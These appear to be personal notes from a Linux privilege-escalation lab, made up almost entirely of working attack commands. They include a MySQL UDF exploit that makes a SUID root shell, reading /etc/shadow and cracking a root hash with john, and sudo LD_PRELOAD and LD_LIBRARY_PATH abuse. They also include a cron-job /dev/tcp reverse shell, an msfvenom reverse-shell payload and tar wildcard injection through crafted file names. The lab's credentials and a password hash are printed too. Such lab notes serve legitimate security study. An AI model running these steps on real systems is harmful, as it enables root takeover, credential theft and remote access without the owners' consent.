# LINUX PRIVESC

```
export IP=10.10.50.217
```
```
ssh user@$IP -oHostKeyAlgorithms=+ssh-rsa
password321
```

https://www.exploit-db.com/exploits/1518

```
cd /home/user/tools/mysql-udf
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

mysql -u root

use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';

select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

exit

/tmp/rootbash -p
rm /tmp/rootbash
exit
```

```
cat /etc/shadow
```

copy the root password and save it to a file called hash.txt (in this case, `$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0`), then use john to decrypt it:

```
john --wordlist=~/../../usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash.txt
```

how to make a new password:
```
mkpasswd -m sha-512 12345
```
```
openssl passwd newpasswordhere
```
Create a shared object:
```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```
A root shell should spawn after this command:
```
sudo LD_PRELOAD=/tmp/preload.so man
```
---
```
ldd /usr/sbin/apache2
```
```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```
```
sudo LD_LIBRARY_PATH=/tmp apache2
```

```
cat /etc/crontab
```
```
locate overwrite.sh
```
```
ls -l /usr/local/bin/overwrite.sh
```

```
#!/bin/bash
bash -i >& /dev/tcp/my_ip/4444 0>&1
```
Set up a netcat listener and wait for the cron job to run

---

```
cat /usr/local/bin/compress.sh
```
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=`my_ip LPORT=4444 -f elf -o shell.elf
```
```
chmod +x /home/user/shell.elf
```
```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```